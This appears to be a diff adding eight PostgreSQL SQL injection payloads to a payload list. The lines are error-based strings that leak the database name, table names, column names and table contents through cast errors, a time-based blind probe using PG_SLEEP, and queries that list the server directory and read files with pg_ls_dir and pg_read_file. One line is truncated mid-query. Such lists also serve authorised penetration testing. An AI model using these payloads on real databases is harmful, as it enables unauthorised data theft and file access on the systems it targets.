@@ -1,0 +1,8 @@
+' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
+' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
+' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
+' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
+AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
+AND [RANDNUM]=(SELECT COUNT(*) FROM 
+select pg_ls_dir('./');
+select pg_read_file('PG_VERSION', 0, 200);
